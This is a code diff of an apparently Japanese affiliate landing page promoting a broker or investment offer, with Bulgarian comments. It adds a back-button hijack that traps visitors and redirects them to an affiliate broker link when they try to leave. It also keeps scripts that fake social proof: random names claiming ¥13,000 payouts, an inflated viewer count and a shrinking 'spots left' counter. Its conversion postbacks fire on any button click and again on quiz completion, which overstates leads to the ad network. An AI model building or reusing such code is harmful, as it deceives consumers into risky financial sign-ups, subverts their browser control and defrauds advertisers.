@@ -10,7 +10,7 @@
 
 <script>
 !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', 'YOUR_PIXEL_ID');
+fbq('init', 'YOUR_PIXEL_ID'); // ЗАМЕНИ С ТВОЯ PIXEL ID
 fbq('track', 'PageView');
 </script>
 <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID&ev=PageView&noscript=1"/></noscript>
@@ -632,7 +632,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Hiragino Kaku Gothic ProN","N
 
 <script>
 // ══════════════════════════════════════════
-// URL PARAMS FORWARDING LOGIC
+// 1. URL PARAMS & FORWARDING LOGIC
 // ══════════════════════════════════════════
 const urlP = new URLSearchParams(window.location.search);
 const PA = {
@@ -642,7 +642,6 @@ const PA = {
   bannerId   : urlP.get('bannerid')   || ''
 };
 
-// Safe Affiliate Links forwarding
 function updateLinks() {
   document.querySelectorAll('.track-link').forEach(link => {
     try {
@@ -655,68 +654,52 @@ function updateLinks() {
     } catch(e) {}
   });
 }
-document.addEventListener('DOMContentLoaded', updateLinks);
 
 // ══════════════════════════════════════════
-// FACEBOOK PIXEL + GOOGLE RETARGETING EVENTS
+// 2. PROPELLERADS S2S POSTBACK И ПИКСЕЛИ
 // ══════════════════════════════════════════
+function sendPropellerPostback() {
+    if (!PA.clickId) {
+        console.log("No ClickID, postback skipped.");
+        return;
+    }
+    const aid = "1063015";
+    const postbackUrl = `https://ad.propellerads.com/conversion.php?aid=${aid}&tid=${PA.clickId}&visitor_id=${PA.clickId}`;
+    
+    if (navigator.sendBeacon) {
+        navigator.sendBeacon(postbackUrl);
+    } else {
+        fetch(postbackUrl, { mode: 'no-cors' });
+    }
+    console.log("Propeller Postback Sent: " + PA.clickId);
+}
+
+// Активираме линковете и закачаме Postback към ВСИЧКИ CTA бутони
+document.addEventListener('DOMContentLoaded', () => {
+    updateLinks();
+    
+    document.querySelectorAll('.track-link').forEach(btn => {
+        btn.addEventListener('click', () => {
+            sendPropellerPostback();
+            if (typeof fbq !== 'undefined') fbq('track', 'Lead');
+            if (typeof gtag !== 'undefined') gtag('event', 'generate_lead');
+        });
+    });
+});
+
 function fireQuizComplete() {
-  // Fire only when a real user finishes the quiz
+  sendPropellerPostback(); // Застраховка при завършване на куиза
   if (typeof fbq !== 'undefined') {
     fbq('trackCustom', 'QuizCompleted', { zone: PA.zoneId });
-    fbq('track', 'Lead'); 
   }
   if (typeof gtag !== 'undefined') {
     gtag('event', 'quiz_completed', { zone_id: PA.zoneId });
-    gtag('event', 'generate_lead');
   }
-  // Phone vibration feedback
   if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
 }
 
 // ══════════════════════════════════════════
-// LIVE ELEMENTS (Viewers, Toasts, Spots)
-// ══════════════════════════════════════════
-(function(){
-  const el = document.getElementById('view-count');
-  let n = 4291;
-  setInterval(() => { n += Math.floor(Math.random() * 3); el.textContent = n.toLocaleString('ja-JP'); }, 4500);
-})();
-
-const names = ['田中','佐藤','鈴木','高橋','渡辺','伊藤','山本','中村','小林','加藤','吉田','山田'];
-const prefs  = ['東京','大阪','神奈川','愛知','福岡','北海道','埼玉','千葉'];
-const acts   = ['口座を開設しました 🎉','MUGENに参加しました 🔥','¥13,000を受け取りました 💰'];
-function showToast() {
-  const t = document.getElementById('toast');
-  document.getElementById('toast-name').textContent = `${prefs[Math.floor(Math.random()*prefs.length)]}の${names[Math.floor(Math.random()*names.length)]}さん`;
-  document.getElementById('toast-action').textContent = acts[Math.floor(Math.random()*acts.length)];
-  t.classList.add('show');
-  setTimeout(() => t.classList.remove('show'), 3800);
-}
-setTimeout(() => { showToast(); setInterval(showToast, 7500); }, 3000);
-
-let spots = 47;
-setInterval(() => {
-  if (spots > 12) { spots--; const el = document.getElementById('spots-num'); if (el) el.textContent = spots; }
-}, 8000);
-
-// SCROLL POPUP
-(function(){
-  const popup = document.getElementById('scroll-popup');
-  const close = document.getElementById('popup-close');
-  let shown = false;
-  close.addEventListener('click', () => { popup.classList.remove('show'); shown = true; });
-  window.addEventListener('scroll', () => {
-    if (shown) return;
-    if (window.scrollY / (document.body.scrollHeight - window.innerHeight) > 0.35) {
-      popup.classList.add('show'); shown = true;
-      setTimeout(() => popup.classList.remove('show'), 7000);
-    }
-  }, { passive: true });
-})();
-
-// ══════════════════════════════════════════
-// QUIZ & RESULTS LOGIC
+// 3. QUIZ & RESULTS LOGIC
 // ══════════════════════════════════════════
 const ans = {}; let curQ = 1; const TOTAL = 5;
 
@@ -790,10 +773,7 @@ function showResult() {
   document.getElementById('prog-pct').textContent  = '100%';
   window.scrollTo({ top: 0, behavior: 'smooth' });
   
-  // Make sure affiliate params are forwarded correctly to the newly revealed buttons
   updateLinks();
-
-  // THE MAGIC: Send real data to Facebook & Google pixels
   fireQuizComplete();
 
   const q1  = ans[1] || 'b';
@@ -805,46 +785,79 @@ function showResult() {
 }
 
 // ══════════════════════════════════════════
-// ══════════════════════════════════════════
-// EXIT-REDIRECT (BACK-BUTTON HIJACK) - 2026 UPDATE
+// 4. EXIT-REDIRECT (BACK-BUTTON HIJACK)
 // ══════════════════════════════════════════
 (function() {
-  const exitUrlBase = "https://clicks.affstrack.com/c?c=1120254&l=ja&p=6";
-  
-  function getExitUrl() {
-    try {
-      const url = new URL(exitUrlBase);
-      if (PA.zoneId)     url.searchParams.set('aff_sub',  PA.zoneId);
-      if (PA.clickId)    url.searchParams.set('aff_sub2', PA.clickId);
-      if (PA.campaignId) url.searchParams.set('aff_sub3', PA.campaignId);
-      if (PA.bannerId)   url.searchParams.set('aff_sub4', PA.bannerId);
-      return url.toString();
-    } catch(e) {
-      return exitUrlBase; 
-    }
-  }
-
   let isHijacked = false;
+  const exitUrlBase = "https://clicks.affstrack.com/c?c=1120254&l=ja&p=6";
 
-  function initHijack() {
+  function initExitHijack() {
     if (isHijacked) return;
-    // Вкарваме фалшива стъпка в историята ВЕДНАГА щом браузърът ни позволи (след клик/скрол)
     history.pushState({hijacked: true}, null, location.href);
     isHijacked = true;
   }
 
-  // Дебнем за ВСЯКАКВО действие от потребителя, за да отключим защитата на браузъра
+  // АКТИВИРА СЕ ПРИ ПЪРВОТО ДОКОСВАНЕ / СКРОЛВАНЕ
   ['click', 'touchstart', 'scroll', 'mousemove'].forEach(evt => {
-    window.addEventListener(evt, initHijack, { once: true, passive: true });
+    window.addEventListener(evt, initExitHijack, { once: true, passive: true });
   });
 
-  // Когато потребителят натисне "Назад"
   window.addEventListener('popstate', function(event) {
     if (isHijacked) {
-      history.go(1); // Леко го бутаме напред, за да не счупим браузъра
-      window.location.replace(getExitUrl()); // ИЗСТРЕЛВАМЕ ГО КЪМ БРОКЕРА!
+      history.go(1); // Връщаме състоянието за стабилност
+      try {
+        const url = new URL(exitUrlBase);
+        if (PA.zoneId) url.searchParams.set('aff_sub', PA.zoneId);
+        if (PA.clickId) url.searchParams.set('aff_sub2', PA.clickId);
+        if (PA.campaignId) url.searchParams.set('aff_sub3', PA.campaignId);
+        if (PA.bannerId) url.searchParams.set('aff_sub4', PA.bannerId);
+        window.location.replace(url.toString());
+      } catch(e) {
+        window.location.replace(exitUrlBase);
+      }
     }
   });
+})();
+
+// ══════════════════════════════════════════
+// 5. LIVE ELEMENTS (Toasts, Tickers, Popups)
+// ══════════════════════════════════════════
+(function(){
+  const el = document.getElementById('view-count');
+  let n = 4291;
+  setInterval(() => { n += Math.floor(Math.random() * 3); el.textContent = n.toLocaleString('ja-JP'); }, 4500);
+})();
+
+const names = ['田中','佐藤','鈴木','高橋','渡辺','伊藤','山本','中村','小林','加藤','吉田','山田'];
+const prefs  = ['東京','大阪','神奈川','愛知','福岡','北海道','埼玉','千葉'];
+const acts   = ['口座を開設しました 🎉','MUGENに参加しました 🔥','¥13,000を受け取りました 💰'];
+function showToast() {
+  const t = document.getElementById('toast');
+  if(!t) return;
+  document.getElementById('toast-name').textContent = `${prefs[Math.floor(Math.random()*prefs.length)]}の${names[Math.floor(Math.random()*names.length)]}さん`;
+  document.getElementById('toast-action').textContent = acts[Math.floor(Math.random()*acts.length)];
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3800);
+}
+setTimeout(() => { showToast(); setInterval(showToast, 7500); }, 3000);
+
+let spots = 47;
+setInterval(() => {
+  if (spots > 12) { spots--; const el = document.getElementById('spots-num'); if (el) el.textContent = spots; }
+}, 8000);
+
+(function(){
+  const popup = document.getElementById('scroll-popup');
+  const close = document.getElementById('popup-close');
+  let shown = false;
+  close.addEventListener('click', () => { popup.classList.remove('show'); shown = true; });
+  window.addEventListener('scroll', () => {
+    if (shown) return;
+    if (window.scrollY / (document.body.scrollHeight - window.innerHeight) > 0.35) {
+      popup.classList.add('show'); shown = true;
+      setTimeout(() => popup.classList.remove('show'), 7000);
+    }
+  }, { passive: true });
 })();
 </script>
 </body>
